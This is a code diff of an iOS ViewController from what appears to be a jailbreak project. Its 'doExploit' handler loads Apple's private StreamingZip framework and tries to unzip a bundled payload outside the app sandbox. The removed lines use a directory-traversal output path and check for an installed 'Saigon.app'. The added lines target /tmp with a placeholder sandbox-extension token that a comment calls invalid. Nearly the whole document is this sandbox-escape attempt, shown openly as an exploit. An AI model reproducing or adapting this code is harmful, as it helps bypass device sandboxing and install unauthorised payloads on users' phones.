@@ -9,6 +9,7 @@
 #import "ViewController.h"
 #include <stdio.h>
 #include <stdlib.h>
+#define die() return;
 
 @interface ViewController ()
 @property (weak, nonatomic) IBOutlet UIButton *exploit;
@@ -31,6 +32,23 @@
     // Dispose of any resources that can be recreated.
 }
 
+BOOL loadPrivateAPIWithPath(NSString* path) {
+    NSBundle* bundle = [NSBundle bundleWithPath:path];
+    return [bundle load];
+}
+
+- (void) exit_with_failure:(NSString*)reason retry:(bool)retry{
+    dispatch_async(dispatch_get_main_queue(), ^(void){
+        [_exploit setTitle:reason forState:UIControlStateDisabled];
+        [_exploit setEnabled:retry];
+    });
+}
+
+- (void) change_exploit_status:(NSString*)status {
+    dispatch_async(dispatch_get_main_queue(), ^(void){
+        [_exploit setTitle:status forState:UIControlStateDisabled];
+    });
+}
 
 - (IBAction)doExploit:(id)sender {
     printf("Welcome, starting exploit..\n");
@@ -44,72 +62,72 @@
     });
     
     /* Load the private framework */
-    NSBundle *unzipPrivateBundle = [NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StreamingZip.framework"];
-    BOOL success = [unzipPrivateBundle load];
-    if(success) {
-        printf("Loaded private framework...\n");
-        dispatch_async(dispatch_get_main_queue(), ^(void){
-            [_exploit setTitle:@"Setting up" forState:UIControlStateDisabled];
-        });
-        printf("Setting up symbols...\n");
-        Class SZExtractor = NSClassFromString(@"SZExtractor");
-        Class StreamingUnzipper = NSClassFromString(@"StreamingUnzipper");
-        printf("Created an StreamingUnzipper: %p\n",(void*)CFBridgingRetain(StreamingUnzipper));
-        printf("Created an SZExtractor: %p\n",(void*)CFBridgingRetain(SZExtractor));
-        printf("Setting our unsandboxed path\n");
-        //id sandboxToken = ;
-        //NSLog(@"%@", buffer);
-        NSString* zipfile = [[NSBundle mainBundle] pathForResource:@"Payload" ofType:@"zip"];
-        NSData *payload = [NSData dataWithContentsOfFile:zipfile];
-        [SZExtractor enableDebugLogging];
-        id delegate = [[SZExtractor alloc] valueForKey:@"delegate"];
-        [delegate enableDebugLogging];
-        printf("Allocated an SZExtractorDelegate to SZExtractor\n");
-        [[delegate alloc] initForLocalExtractionWithPath:@"/tmp" options:nil];
-        [[delegate alloc] supplyBytes:payload withCompletionBlock:^(void){
-            printf("Done!");
-        }];
-        printf("Adding a StreamingUnzipper to the SZExtractor\n");
-        id inProcessUnzipper = [[SZExtractor alloc] valueForKey:@"_inProcessUnzipper"];
-        inProcessUnzipper = [StreamingUnzipper alloc];
-        [inProcessUnzipper supplyBytes:payload withReply:^(void){
-            printf("Unzipping stuff to /tmp\n");
-        }];
-        [inProcessUnzipper setupUnzipperWithOutputPath:@"/private/var/mobile/Media/DCIM/../../../../../tmp" sandboxExtensionToken:"12345670" options:nil withReply:nil];
-        printf("Extracting payload..\n");
-        dispatch_async(dispatch_get_main_queue(), ^(void){
-            [_exploit setTitle:@"Extracting payload" forState:UIControlStateDisabled];
-        });
-        
-        /* Give the extraction some time (10 seconds), if the app's still not in /Applications the extraction failed and thus the exploit */
-        printf("Waiting until extraction is complete...\n");
-        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
-            if(![[NSFileManager defaultManager] fileExistsAtPath:@"/Applications/Saigon.app/Saigon"]) {
-                printf("Extraction timeout exceeded. Exploit failed :( \n");
-                dispatch_async(dispatch_get_main_queue(), ^(void){
-                    [_exploit setEnabled:true];
-                    [_exploit setTitle:@"failed, retry" forState:UIControlStateNormal];
-                    self.attempts++;
-                    if(_attempts > 4) {
-                        [_exploit setTitle:@"Probs don't work" forState:UIControlStateNormal];
-                    }
-                });
-            } else {
-                [_exploit setTitle:@"Done, please wait" forState:UIControlStateDisabled];
-                [NSThread detachNewThreadWithBlock:^(void){
-                    //Respring bug must be entered here as we need the icon to appear on the homescreen
-                }];
-            }
-        });
-    } else {
-        dispatch_async(dispatch_get_main_queue(), ^(void){
-            [_exploit setTitle:@"PFW not found :(" forState:UIControlStateDisabled];
-        });
-        return;
+    BOOL loaded = loadPrivateAPIWithPath(@"/System/Library/PrivateFrameworks/StreamingZip.framework");
+    
+    /* Check if the framework is loaded, if not then abort the exploit */
+    if(!loaded) {
+        [self exit_with_failure:@"Unable to load PFW" retry:false];
+        die();
     }
     
+    printf("Loaded private framework...\n");
+    [self change_exploit_status:@"Setting up..."];
+    
+    printf("Setting up symbols...\n");
+    Class SZExtractor = NSClassFromString(@"SZExtractor");
+    Class StreamingUnzipper = NSClassFromString(@"StreamingUnzipper");
+    
+    if(SZExtractor == nil || StreamingUnzipper == nil) {
+        [self exit_with_failure:@"Symbols are null :(" retry:true];
+        die();
+    }
+    
+    printf("Created an StreamingUnzipper: %p\n",(void*)CFBridgingRetain(StreamingUnzipper));
+    printf("Created an SZExtractor: %p\n",(void*)CFBridgingRetain(SZExtractor));
+    printf("Setting our payload\n");
+    
+    /* Zipfile contains the files to be extracted to directory outside the sandbox */
+    NSString* zipfile = [[NSBundle mainBundle] pathForResource:@"Payload" ofType:@"zip"];
+    NSData *payload = [NSData dataWithContentsOfFile:zipfile]; //Convert the contents of the zip to a block of bytes
+    
+    /* Enable verbose extracting */
+    [SZExtractor enableDebugLogging];
+    
+    /* Create a new SZExtractorDelegate with verbose mode enabled */
+    id delegate = [[SZExtractor alloc] valueForKey:@"delegate"];
+    [delegate enableDebugLogging];
+    printf("Allocated an SZExtractorDelegate to SZExtractor\n");
+    
+    [self change_exploit_status:@"Setting up extractor"];
+    
+    /* Initialise with the /tmp path which is a writable directory outside the sandbox */
+    [[delegate alloc] initForLocalExtractionWithPath:@"/tmp" options:nil];
+    [[delegate alloc] supplyBytes:payload withCompletionBlock:^(void){
+        printf("Successfully initialized!\n");
+    }];
+    
+    printf("Adding a StreamingUnzipper to the SZExtractor\n");
+    id inProcessUnzipper = [[SZExtractor alloc] valueForKey:@"_inProcessUnzipper"];
+    inProcessUnzipper = [StreamingUnzipper alloc];
+    [inProcessUnzipper supplyBytes:payload withReply:^(void){
+        printf("Unzipping stuff to /tmp\n");
+    }];
+    
+    /* Setting the actual unzipper with a path outside of the sandbox
+     * Note: The sandbox extension token stil needs some work, and is invalid as for now
+     */
+    [inProcessUnzipper setupUnzipperWithOutputPath:@"/tmp" sandboxExtensionToken:"12345670" options:nil withReply:^(void){
+        printf("Extracting payload..\n");
+    }];
+    
+    [self change_exploit_status:@"Extracting to /tmp"];
     
     
+    /* Cleaning up, were done now */
+    
+    SZExtractor = NULL;
+    StreamingUnzipper = NULL;
+    [self change_exploit_status:@"Done!"];
 }
 
 /* Used to enable verbose */
@@ -134,4 +152,3 @@
     printf("Did something\n");
 }
 @end
-
